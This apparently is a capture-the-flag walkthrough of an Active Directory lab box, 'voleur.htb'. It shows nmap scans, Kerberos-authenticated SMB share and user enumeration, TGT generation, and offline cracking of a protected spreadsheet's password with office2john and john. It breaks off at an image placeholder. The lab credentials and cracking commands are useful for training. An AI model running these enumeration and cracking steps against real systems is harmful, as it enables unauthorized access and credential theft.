# Initial credentials
```python
ryan.naylor:HollowOct31Nyt
```

# Host file setup
```python
sudo nxc smb 10.129.232.130 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.232.130  445    DC               [*]  x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
```
Some things to note:
- NTLM auth is disabled which means ill have to use kerberos auth
- SMB signing is enabled

# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT dc.voleur.htb                  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 12:45 -0400
Nmap scan report for dc.voleur.htb (10.129.232.130)
Host is up (0.014s latency).
rDNS record for 10.129.232.130: DC.voleur.htb
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2222/tcp  open  EtherNetIP-1
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
61568/tcp open  unknown
61569/tcp open  unknown
61570/tcp open  unknown
61599/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.78 seconds
```
## Nmap
```python
nmap -p 53,88,135,139,389,445,464,593,636,2222,3268,3269,5985,9389 -A --min-rate=2000 -sT dc.voleur.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-06 12:47 -0400
Nmap scan report for dc.voleur.htb (10.129.232.130)
Host is up (0.015s latency).
rDNS record for 10.129.232.130: DC.voleur.htb

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-07 00:47:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2222/tcp open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel
```
DC is running at +8h

# SMB (445)
Since this does not allow NTLM auth ill have to use kerberos

```python
faketime -f +8h nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt
```
I have successful authentication

```python
faketime -f +8h nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [*] Enumerated shares
SMB         dc.voleur.htb   445    dc               Share           Permissions     Remark
SMB         dc.voleur.htb   445    dc               -----           -----------     ------
SMB         dc.voleur.htb   445    dc               ADMIN$                          Remote Admin
SMB         dc.voleur.htb   445    dc               C$                              Default share
SMB         dc.voleur.htb   445    dc               Finance                         
SMB         dc.voleur.htb   445    dc               HR                              
SMB         dc.voleur.htb   445    dc               IPC$            READ            Remote IPC
SMB         dc.voleur.htb   445    dc               IT              READ            
SMB         dc.voleur.htb   445    dc               NETLOGON        READ            Logon server share 
SMB         dc.voleur.htb   445    dc               SYSVOL          READ            Logon server share
```
Read perms on `IT`

```python
faketime -f +8h nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --users-export users.txt
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         dc.voleur.htb   445    dc               Administrator                 2025-01-28 20:35:13 0       Built-in account for administering the computer/domain
SMB         dc.voleur.htb   445    dc               Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         dc.voleur.htb   445    dc               krbtgt                        2025-01-29 08:43:06 0       Key Distribution Center Service Account
SMB         dc.voleur.htb   445    dc               ryan.naylor                   2025-01-29 09:26:46 0       First-Line Support Technician
SMB         dc.voleur.htb   445    dc               marie.bryant                  2025-01-29 09:21:07 0       First-Line Support Technician
SMB         dc.voleur.htb   445    dc               lacey.miller                  2025-01-29 09:20:10 0       Second-Line Support Technician
SMB         dc.voleur.htb   445    dc               svc_ldap                      2025-01-29 09:20:54 0        
SMB         dc.voleur.htb   445    dc               svc_backup                    2025-01-29 09:20:36 0        
SMB         dc.voleur.htb   445    dc               svc_iis                       2025-01-29 09:20:45 0        
SMB         dc.voleur.htb   445    dc               jeremy.combs                  2025-01-29 15:10:32 0       Third-Line Support Technician
SMB         dc.voleur.htb   445    dc               svc_winrm                     2025-01-31 09:10:12 0        
SMB         dc.voleur.htb   445    dc               [*] Enumerated 11 local users: VOLEUR
SMB         dc.voleur.htb   445    dc               [*] Writing 11 local users to users.txt
```
Dumped all the users to a userfile

Kerberoasting and as-rep roasting both failed

For ease of use ill generate a tgt for this user save typing the credentials

```python
faketime -f +8h nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --generate-tgt ryan_naylor 
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\ryan.naylor:HollowOct31Nyt 
SMB         dc.voleur.htb   445    dc               [+] TGT saved to: ryan_naylor.ccache
SMB         dc.voleur.htb   445    dc               [+] Run the following command to use the TGT: export KRB5CCNAME=ryan_naylor.ccache
```

# `IT` SMB share
```python
faketime -f +8h impacket-smbclient voleur.htb/ryan.naylor@dc.voleur.htb -k         
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[-] CCache file is not found. Skipping...
Type help for list of commands
# shares
ADMIN$
C$
Finance
HR
IPC$
IT
NETLOGON
SYSVOL
# use IT
# ls
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 .
drw-rw-rw-          0  Thu Jul 24 16:09:59 2025 ..
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 First-Line Support
# cd First-Line Support
# ls
drw-rw-rw-          0  Wed Jan 29 04:40:17 2025 .
drw-rw-rw-          0  Wed Jan 29 04:10:01 2025 ..
-rw-rw-rw-      16896  Thu May 29 18:23:36 2025 Access_Review.xlsx
# get Access_Review.xlsx
```
Ive downloaded a .xlsx file

It is password protected

```python
office2john Access_Review.xlsx | tee xlsx.hash
Access_Review.xlsx:$office$*2013*100000*256*16*a80811402788c037b50df976864b33f5*500bd7e833dffaa28772a49e987be35b*7ec993c47ef39a61e86f8273536decc7d525691345004092482f9fd59cfa111c
```
Ive generate a hash now ill try to crack it

```python
john xlsx.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2013 for all loaded hashes
Cost 2 (iteration count) is 100000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football1        (Access_Review.xlsx)     
1g 0:00:00:01 DONE (2026-04-06 13:07) 0.5524g/s 459.6p/s 459.6c/s 459.6C/s football1..legolas
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Ive cracked the hash!

# Hunting credentials
![](Pasted%20image%2020260406131010.png)

